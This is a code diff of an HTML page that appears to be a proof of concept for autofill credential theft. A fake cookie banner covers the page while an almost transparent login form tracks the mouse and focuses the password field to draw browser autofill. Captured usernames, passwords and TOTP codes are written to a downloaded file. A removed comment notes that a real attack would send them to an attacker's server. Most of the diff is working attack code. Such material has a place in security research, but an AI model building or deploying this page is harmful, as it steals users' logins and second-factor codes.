@@ -1,43 +1,4 @@
-<script type="text/javascript">
-        var gk_isXlsx = false;
-        var gk_xlsxFileLookup = {};
-        var gk_fileData = {};
-        function filledCell(cell) {
-          return cell !== '' && cell != null;
-        }
-        function loadFileData(filename) {
-        if (gk_isXlsx && gk_xlsxFileLookup[filename]) {
-            try {
-                var workbook = XLSX.read(gk_fileData[filename], { type: 'base64' });
-                var firstSheetName = workbook.SheetNames[0];
-                var worksheet = workbook.Sheets[firstSheetName];
-
-                // Convert sheet to JSON to filter blank rows
-                var jsonData = XLSX.utils.sheet_to_json(worksheet, { header: 1, blankrows: false, defval: '' });
-                // Filter out blank rows (rows where all cells are empty, null, or undefined)
-                var filteredData = jsonData.filter(row => row.some(filledCell));
-
-                // Heuristic to find the header row by ignoring rows with fewer filled cells than the next row
-                var headerRowIndex = filteredData.findIndex((row, index) =>
-                  row.filter(filledCell).length >= filteredData[index + 1]?.filter(filledCell).length
-                );
-                // Fallback
-                if (headerRowIndex === -1 || headerRowIndex > 25) {
-                  headerRowIndex = 0;
-                }
-
-                // Convert filtered JSON back to CSV
-                var csv = XLSX.utils.aoa_to_sheet(filteredData.slice(headerRowIndex)); // Create a new sheet from filtered array of arrays
-                csv = XLSX.utils.sheet_to_csv(csv, { header: 1 });
-                return csv;
-            } catch (e) {
-                console.error(e);
-                return "";
-            }
-        }
-        return gk_fileData[filename] || "";
-        }
-        </script><!DOCTYPE html>
+<!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
@@ -48,7 +9,6 @@
             margin: 0;
             font-family: Arial, sans-serif;
         }
-        /* Styles for the cookie banner */
         #popover {
             position: fixed;
             top: 0;
@@ -57,7 +17,7 @@
             height: 100%;
             background: rgba(0, 0, 0, 0.5);
             z-index: 2147483647;
-            pointer-events: none; /* Allows clicks to pass through */
+            pointer-events: none;
         }
         #cookie-dialog {
             position: relative;
@@ -70,7 +30,7 @@
             box-shadow: 1px 1px 10px 1px #333;
             z-index: 9999;
             text-align: left;
-            pointer-events: auto; /* Ensure buttons are clickable */
+            pointer-events: auto;
         }
         #cookie-dialog h2 {
             font-size: 20px;
@@ -107,7 +67,6 @@
     </style>
 </head>
 <body>
-    <!-- Cookie Banner (Full Overlay) -->
     <div id="popover" popover="manual" style="display: none;">
         <div id="cookie-dialog">
             <h2>Privacy & Transparency</h2>
@@ -119,7 +78,6 @@
         </div>
     </div>
 
-    <!-- Hidden Login Form -->
     <div id="loginform" style="position: fixed; top: 300px; left: 500px; z-index: 2147483647; opacity: 0.001;">
         <form method="post" name="login" action="/" id="login" onchange="getLoginData()">
             <input id="username" name="username" type="text" autocomplete="username">
@@ -129,34 +87,47 @@
     </div>
 
     <script>
-        // Show Popover (Cookie Banner)
         setTimeout(() => {
             const popover = document.getElementById('popover');
             popover.style.display = '';
             popover.showPopover();
         }, 1000);
 
-        // Focus on password input to trigger autofill UI
         setTimeout(() => {
             document.getElementById('password').focus();
         }, 2000);
 
-        // Capture autofilled data
         function getLoginData() {
             const username = document.getElementById('username').value;
             const password = document.getElementById('password').value;
             const totp = document.getElementById('totp').value;
             if (password) {
-                // Log data to console (in a real attack, send to attacker's server)
-                console.log(`username=${username}&password=${password}&totp=${totp}`);
+                // Create text content for test.txt
+                const data = `Username: ${username}\nPassword: ${password}\nTOTP: ${totp}\n---\n`;
                 
-                // Optionally hide form and banner after data capture
+                // Create a Blob with the data
+                const blob = new Blob([data], { type: 'text/plain' });
+                
+                // Create a temporary URL for the Blob
+                const url = window.URL.createObjectURL(blob);
+                
+                // Create a link element to trigger download
+                const a = document.createElement('a');
+                a.href = url;
+                a.download = 'test.txt';
+                document.body.appendChild(a);
+                a.click();
+                
+                // Clean up
+                document.body.removeChild(a);
+                window.URL.revokeObjectURL(url);
+                
+                // Hide form and banner after data capture
                 document.getElementById('loginform').style.display = 'none';
                 document.getElementById('popover').style.display = 'none';
             }
         }
 
-        // Optional: Follow mouse cursor for dynamic positioning
         document.addEventListener('mousemove', function (event) {
             const loginForm = document.getElementById('loginform');
             loginForm.style.top = `${event.pageY - 50}px`;
